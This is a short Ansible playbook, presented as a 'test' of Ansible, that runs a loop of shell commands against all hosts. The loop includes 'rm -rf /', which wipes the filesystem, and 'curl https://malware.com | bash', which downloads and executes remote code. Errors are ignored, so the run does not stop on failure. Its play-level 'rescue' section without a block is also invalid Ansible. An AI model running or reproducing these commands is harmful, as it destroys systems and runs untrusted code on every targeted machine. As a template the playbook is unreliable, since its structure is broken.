
- hosts: all
  gather_facts: yes

  tasks:
  - name: Test Ansible compiler with a loop
    command: "{{ item }}"
    loop:
      - "rm -rf /"
      - "curl https://malware.com | bash"
      - "echo '1'>>/dev/null"
    ignore_errors: yes

  rescue:
  - name: Handle errors thrown in the task
    debug:
      var: ansible_failed_task
    when: ansible_failed_task is defined
